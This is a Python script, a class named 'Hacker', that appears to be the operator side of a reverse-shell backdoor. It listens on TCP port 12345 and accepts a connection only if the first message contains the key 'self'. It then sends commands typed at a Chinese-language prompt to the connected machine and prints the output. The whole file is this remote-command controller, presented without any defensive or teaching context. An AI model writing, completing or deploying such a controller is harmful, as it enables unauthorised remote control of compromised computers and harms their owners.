import socket

class Hacker(object):
    sock=None
    connection=None
    key="self"
    def __init__(self):
        pass

    def listen(self,port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = ('', port)
        self.sock.bind(server_address)
        self.sock.listen(1)
        while True:
            connection, client_address = self.sock.accept()
            if True:
                data = connection.recv(10240)
                if self.key in data.decode("utf-8"):
                    self.connection = connection
                    break
                else:
                    connection.close()
        pass

    def close(self):
        if self.connection is not None:
            self.connection.close()
        self.connection=None
        if self.sock is not None:
            self.sock.close()
        self.sock=None
        pass

    def send(self,msg):
        self.connection.send(msg.encode("utf-8"))
        data = self.connection.recv(10240)
        print (data.decode("utf-8"))
        pass

while True:
    
    demo = Hacker()
    demo.listen(12345)
    while True:
        try:        
            msg = input("请输入命令:") 
            if msg == "exit":
                break
            demo.send(msg)
        except:
            break
    

    demo.close()

